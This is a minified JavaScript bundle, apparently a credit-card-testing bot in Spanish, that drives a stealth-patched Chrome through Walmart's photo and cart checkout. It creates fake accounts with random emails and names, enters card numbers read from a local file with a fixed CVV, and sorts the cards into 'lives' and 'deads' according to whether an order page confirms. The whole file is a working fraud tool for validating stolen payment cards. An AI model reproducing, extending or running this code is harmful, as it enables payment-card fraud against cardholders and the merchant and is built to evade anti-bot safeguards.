var n=(t,e)=>()=>(e||t((e={exports:{}}).exports,e),e.exports);var q=n((mi,g)=>{var mt=require("fs"),ft=new Promise((t,e)=>{mt.readFile("./db/deads.txt","utf8",(i,a)=>{i&&e(i),t(a.split(`
`).filter(o=>o.length>0))})});g.exports={deads:ft}});var S=n((fi,C)=>{var bt=require("fs"),pt=new Promise((t,e)=>{bt.readFile("./db/lives.txt","utf8",(i,a)=>(i&&e(i),t(a.split(`
`).filter(o=>o.length>0))))});C.exports={lives:pt}});var $=n((bi,_)=>{var Ft=require("fs"),xt=new Promise((t,e)=>{Ft.readFile("./db/tarjetas.txt","utf8",(i,a)=>{i&&e(i),a=a.split(`
`).filter(c=>c.length>0);let o=a.filter(c=>c.includes("|")),r=a.filter(c=>c.includes("|")==!1).map(c=>`${c}${o}`);t(r)})});_.exports={tarjetas:xt}});var v=n((pi,P)=>{var{deads:yt}=q(),{lives:kt}=S(),{tarjetas:Tt}=$();P.exports={deads:yt,lives:kt,tarjetas:Tt}});var A=n((Fi,O)=>{var{tarjetas:gt}=v(),D=[],f=[],N=[],j=[];gt.then(t=>{for(var e of t)f.includes(e)==!1&&f.push(e);for(var i of f){var a=i.split("|")[0],o=i.split("|")[1],d=parseInt(i.split("|")[2]);D.push(a),N.push(o),j.push(d)}});O.exports={cards:D,fechaMes:N,fechaA\u00F1o:j}});var M=n((yi,G)=>{var qt=require("fs"),xi=require("colors"),{deads:Ct}=v(),St=async t=>{if((await Ct).filter(a=>a==t).length>0)return console.log(`${t.yellow} este ${"dead".red} ya existe en db/deads.txt`);qt.appendFile("./db/deads.txt",t+`
`,{encoding:"utf-8"},a=>{if(a)throw a;return console.log(`${t.red}`)})};G.exports={agregarDeads:St}});var L=n((ki,X)=>{var z=require("fs"),_t=t=>{z.readFile("./db/tarjetas.txt","utf8",(e,i)=>{let a=i.split(`
`).filter(r=>r.length>0),o=a.filter(r=>r!=t);if(a.length===o.length)return console.log("se ha colocado una tarjeta invalida");let d=o.join(`
`);z.writeFile("./db/tarjetas.txt",d,r=>{if(r)throw r})})};X.exports={barridoTarjetas:_t}});var R=n((gi,E)=>{var $t=require("fs"),Ti=require("colors"),{lives:Pt}=v(),Dt=async t=>{let e=t.split("|")[0];await Pt.then(i=>{if(console.log(i),i.filter(o=>o===t).length>0)return console.log(`${t.yellow} este live ya existe en db/live.txt`);$t.appendFile("./db/lives.txt",t+`
`,{encoding:"utf-8"},o=>{if(o)throw o;return console.log(`${e.green}`)})})};E.exports={agregarLive:Dt}});var U=n((qi,B)=>{var Nt=(t,e)=>{(!e||e<1)&&(e=t.length);for(let i=0;i<e;++i){let a=Math.floor(Math.random()*t.length),o=Math.floor(Math.random()*t.length),d=t[a];t[a]=t[o],t[o]=d}};B.exports={disorder:Nt}});var H=n((Ci,Z)=>{var{disorder:jt}=U(),{faker:b}=require("@faker-js/faker"),Ot=require("fs"),At=async({page:t,productoPersonalizado:e})=>{console.log("no tienes cuenta creada, se procedera a crear una".yellow);let i=!0,a="https://www.walmart.com/account/?action=Create&rm=true",o=b.internet.password(10,!0,/[A-Z][0-9][a-z]/,"@Hookom119"),d=["a","b","c","d","e","f","g","h","i","1","2","6","3","z","h","1","9","0","o","p","Z","i","1","2","6","3","z","h","1","9","0","o","p","Z"];jt(d),d=d.toString().replaceAll(",","")+"@gmail.com",await t.goto("https://www.walmart.com/account/signup?vid=oaoh"),await t.waitForSelector("#sign-in-form > div > div > input"),await t.type("#sign-in-form > div > div > input",d),await t.click("#sign-in-form > button"),await t.waitForNavigation(),await t.waitForSelector("#sign-up-form > div:nth-child(2) > div > input"),await t.waitForTimeout(1e3),await t.type("#sign-up-form > div:nth-child(2) > div > input",b.name.firstName()),await t.type("#sign-up-form > div:nth-child(4) > div > input",b.name.lastName()),await t.type("#sign-up-form > div:nth-child(7) > div > div > input",o),await t.click("#sign-up-form > button"),await t.waitForNavigation(),await t.waitForTimeout(1e3),await t.$("div > button > svg")&&await t.click("div > button > svg"),await t.waitForTimeout(1e3),a==="https://www.walmart.com/account/?action=Create&rm=true"&&console.log("Cuenta creada correctamente".green),await t.goto(e||"https://www.walmart.com/ip/seort/10448549"),await t.waitForSelector(".dib > button"),await t.waitForTimeout(3e3),await t.click(".dib > button"),await t.waitForTimeout(3e3),await t.goto("https://www.walmart.com/cart"),await t.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await t.waitForTimeout(3e3),await t.$("div > div > section > div > div:nth-child(4) > div")&&(await t.click(".flex .sticky .shadow-1 div .ph3  button"),await t.waitForNavigation(),await t.waitForTimeout(6e3),await t.click("div > div > section > div > div:nth-child(4) > div"),await t.waitForTimeout(1e3),await t.waitForSelector("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input"),await t.type("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input","10001"),await t.waitForSelector("div.pa0.ma0 > div:nth-child(1) > label"),await t.click("div.pa0.ma0 > div:nth-child(1) > label"),await t.waitForTimeout(1e3),await t.waitForSelector("div.w-100.pa4.bt.b--near-white > button"),await t.click("div.w-100.pa4.bt.b--near-white > button"),await t.waitForTimeout(1e3),await t.waitForSelector("div.flex.justify-center.pb6 > div > div > div > div > button"),await t.click("div.flex.justify-center.pb6 > div > div > div > div > button"),await t.waitForNavigation(),i=!1,console.log("producto agregado al carrito".green)),await t.$("div.flex.items-baseline.pl2.ml1-l > button")&&(await t.click("div.flex.items-baseline.pl2.ml1-l > button"),await t.waitForTimeout(2e3),await t.click(".flex .sticky .shadow-1 div .ph3  button"),await t.waitForNavigation(),i=!1),i==!0&&(await t.click(".flex .sticky .shadow-1 div .ph3  button"),await t.waitForNavigation()),await t.waitForSelector("#totalSummary"),await t.waitForTimeout(2e3);let s=!0;do{let h=t.mainFrame().url();await t.waitForTimeout(1e3),h.search("checkout")!=-1&&(Ot.writeFile("./db/carritoUrl.txt",h,"utf8",m=>{if(m)throw m;console.log("carrito extraido con \xE9xito".green)}),s=!1)}while(s)};Z.exports={login:At}});var p=n((Si,V)=>{var{login:Gt}=H(),Mt=require("fs"),zt=async({page:t,productoPersonalizado:e})=>{let i="#__next > div:nth-child(1) > div > span > header > div:nth-child(7) > a";return console.log("iniciando scrapper..."),await t.goto("https://www.walmart.com"),await t.waitForSelector(i),(await t.$eval(i,o=>o.href)).includes("https://www.walmart.com/account/login?vid=oaoh")===!0?(await Gt({page:t,productoPersonalizado:e}),Mt.readFileSync("./db/carritoUrl.txt","utf-8")):console.log("Ya existe un usuario".yellow)};V.exports={verifyLogin:zt}});var F=n((_i,W)=>{var Xt=async({page:t})=>{let e='button[data-automation-id="fulfillment-continue"]';await t.waitForTimeout(1e3);let i=await t.$(e),a=await t.mainFrame().url();a.search("fulfillment")!=-1&&await t.waitForSelector(e),i&&a.search("fulfillment")!=-1&&(await t.click(e),await t.waitForNavigation())};W.exports={stepOneFullFillMentPhoto:Xt}});var x=n(($i,Y)=>{var Lt=async({page:t})=>{let e='button[data-automation-id="address-book-action-buttons-on-continue"]',i="#firstName",a="#lastName",o="#phone",d="#addressLineOne",r="div:nth-child(6) > div > button.button.button--link > span",c=!0;await t.waitForTimeout(1e3);let u=await t.$(i),s=await t.mainFrame().url();if(s.search("shipping-address")!=-1&&await t.waitForSelector(i),await t.waitForTimeout(1e3),u&&s.search("shipping-address")!=-1){i&&(await t.waitForSelector(i),await t.type(i,"John"),await t.type(a,"Lenon"),await t.type(o,"2121523478"),await t.type(d,"Calle buena"),await t.waitForTimeout(200),await t.click(e),await t.waitForSelector(r),await t.waitForTimeout(1e3),await t.click(r),await t.waitForSelector('[data-automation-id="address-tile-1"]'),await t.waitForTimeout(1e3)),await t.waitForSelector(e),await t.waitForTimeout(1e3),await t.click(e);do await t.waitForTimeout(1e3),c=await t.$("div.spinner.spinner-large.spinner-colorize.spinner-fixed");while(c)}};Y.exports={stepTwoFullFillMentPhoto:Lt}});var J=n((Pi,I)=>{var{stepOneFullFillMentPhoto:Et}=F(),{stepTwoFullFillMentPhoto:Rt}=x(),Bt=async({page:t})=>{let e="#dropArea > div.device > label",i="button.btn.btn-primary.btn-md-long.action.mb-0.font-weight-bold[disabled]",a='a[class="btn btn-primary btn-add-to-cart disabled"]',o="#zip-code-popover > div > div > input";await t.goto("https://photos3.walmart.com/order/prints-builder?finish=glossy&size=4x4&copies=1#"),await t.waitForSelector(e),await t.waitForTimeout(1e3);let[d]=await Promise.all([t.waitForFileChooser(),t.click(e)]);await d.accept(["./assets/logo.png"]);let r=!0;do await t.waitForTimeout(1e3),r=await t.$(i);while(r);await t.waitForTimeout(1500),await t.click('button[aria-label="Add photos"]'),r=!0;do await t.waitForTimeout(1e3),r=await t.$(a);while(r);await t.click('a[class="btn btn-primary btn-add-to-cart"]'),await t.waitForSelector("#popover-anchor"),await t.waitForTimeout(1e3),await t.click("#popover-anchor"),await t.waitForSelector(o),await t.click(o),await t.click(o),await t.type(o,"10001"),await t.waitForTimeout(1e3),await t.click("#zip-code-popover > div > button.btn.btn-primary"),await t.waitForTimeout(1e3),await t.click("a.checkout-button.btn.btn-primary.btn-lg.btn-block"),await t.waitForNavigation(),await Et({page:t}),await Rt({page:t})};I.exports={fotoAuto:Bt}});var it=n((Di,tt)=>{var K=require("puppeteer-extra"),{cards:l,fechaMes:y,fechaA\u00F1o:k}=A(),Ut=require("puppeteer-extra-plugin-stealth"),{agregarDeads:Zt}=M(),{barridoTarjetas:Q}=L(),{agregarLive:Ht}=R(),Vt=require("fs"),{verifyLogin:Wt}=p(),{fotoAuto:Yt}=J(),{stepOneFullFillMentPhoto:It}=F(),{stepTwoFullFillMentPhoto:Jt}=x();K.use(Ut());var Qt=async({productoPersonalizado:t})=>{let e=0;countl=0,contador=1;let i,a=await K.launch({headless:!1,defaultViewport:null,ignoreHTTPSErrors:!0,userDataDir:"./userData",executablePath:"C:/Program Files/Google/Chrome/Application/chrome.exe",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]}),o=(await a.pages())[0];o.setDefaultTimeout(0),o.setDefaultNavigationTimeout(0),await Wt({page:o,productoPersonalizado:t}),await o.goto("https://www.walmart.com/checkout/photo#/payment");let d=Vt.readFileSync("./db/carritoUrl.txt","utf-8");for(var r=0;r<=l.length;++r){let u=!0,s=!0;await o.waitForTimeout(3e3),await o.$('div[data-modal-message-descriptor="PhotoPCExpiredMessage"]')&&await Yt({page:o}),await It({page:o}),await Jt({page:o});do{await o.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button")&&(await o.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button"),await o.waitForTimeout(2500),s=!1),await o.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span")&&(await o.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await o.waitForTimeout(1e3),await o.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await o.waitForTimeout(1e3),await o.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await o.waitForTimeout(1e3),await o.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await o.waitForSelector("#firstName"),s=!1);let ht=await o.$("#firstName");await o.waitForTimeout(2e3),ht&&(await o.type("#creditCard",`${l[r]}`),await o.type("#month-chooser",`${y[r]}`),await o.type("#year-chooser",`${k[r]}`),await o.type("#cvv","065"),await o.waitForTimeout(1e3),await o.click("div > form > div.edit-form-actions > div > button"),await o.waitForTimeout(2e3),s=!1)}while(s);do await o.waitForTimeout(1e3),u=await o.$("div.spinner.spinner-large.spinner-colorize.spinner-fixed");while(u);if(console.log(contador," ",l[r]),e==0&&(i=await a.newPage(),i.setDefaultTimeout(0),i.setDefaultNavigationTimeout(0)),await i.bringToFront(),await i.waitForTimeout(2e3),await i.goto(d),await i.waitForSelector("#cvv-field"),await i.$("#cvv-field")){await i.type("#cvv-field","123"),await o.waitForTimeout(1e3),await i.click("#mobile-sticky-footer > div > section > button"),await i.waitForTimeout(7e3);let vt=await i.$("body > div:nth-child(18) > div > div.w_HB > div.w_GY.w_GZ > div > div.w_Gh > div > div > div.w_Q.w_U.mb1");t:var c=i.mainFrame().url();c.search("thankyou")!=-1&&(countl++,console.log("lives del lote",countl),await Ht(`${l[r]}|${y[r]}|${k[r]}`),Q(`${l[r]}`),await i.goto(t||"https://www.walmart.com/ip/seort/10448549"),await i.waitForSelector(".dib > button"),await i.waitForTimeout(3e3),await i.click(".dib > button"),await i.waitForTimeout(3e3),await i.goto("https://www.walmart.com/cart"),await i.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await i.click(".flex .sticky .shadow-1 div .ph3  button"),await i.waitForTimeout(7e3)),c.search("thankyou")==-1&&(await Zt(`${l[r]}|${y[r]}|${k[r]}`),Q(`${l[r]}`)),i&&(e=1),await o.bringToFront(),contador++}}await a.close()};tt.exports={foto:Qt}});var at=n((Ni,et)=>{var ot=require("puppeteer-extra"),Kt=require("puppeteer-extra-plugin-stealth"),{verifyLogin:ti}=p();ot.use(Kt());var ii=async({productoPersonalizado:t})=>{let e=await ot.launch({headless:!1,defaultViewport:null,executablePath:"C:/Program Files/Google/Chrome/Application/chrome.exe",userDataDir:"./userData",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]}),i=(await e.pages())[0];return await i.setDefaultTimeout(0),await i.setDefaultNavigationTimeout(0),await ti({page:i,productoPersonalizado:t}),await e.close()};et.exports={loginAuto:ii}});var dt=n((ji,nt)=>{var rt=require("puppeteer-extra"),oi=require("puppeteer-extra-plugin-stealth");rt.use(oi());var ei=async({tipo:t})=>{let i=(await(await rt.launch({headless:!1,defaultViewport:null,userDataDir:"./userData",executablePath:"C:/Program Files/Google/Chrome/Application/chrome.exe",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]})).pages())[0];await i.setDefaultTimeout(0),await i.bringToFront(),t=="manual-login"&&await i.goto("https://www.walmart.com/account/login"),t=="manual-foto"&&await i.goto("https://photos3.walmart.com/order/prints-builder?finish=glossy&size=4x4&copies=1#")};nt.exports={manual:ei}});var st=n((Oi,ct)=>{var{foto:ai}=it(),{loginAuto:ri}=at(),{manual:ni}=dt(),di=async({tipo:t,productoPersonalizado:e})=>{t==="foto"&&ai({productoPersonalizado:e}),t==="login"&&ri({productoPersonalizado:e}),(t==="manual-login"||t==="manual-foto")&&ni({tipo:t})};ct.exports={selectorScrapper:di}});var ut=n((Ai,wt)=>{var{Router:ci}=require("express"),{selectorScrapper:si}=st(),lt=ci();lt.post("/",async(t,e)=>{let{tipo:i,productoPersonalizado:a}=t.body;await si({tipo:i,productoPersonalizado:a}),e.send()});wt.exports=lt});var T=require("express"),li=ut(),wi=require("detect-port"),w=T(),ui=async()=>(await wi().then(t=>{w.set("port",t)}),w.use(T.urlencoded({extended:!1})),w.use(T.json()),w.use(li),w.listen(w.get("port")),w.get("port"));module.exports={server:ui};
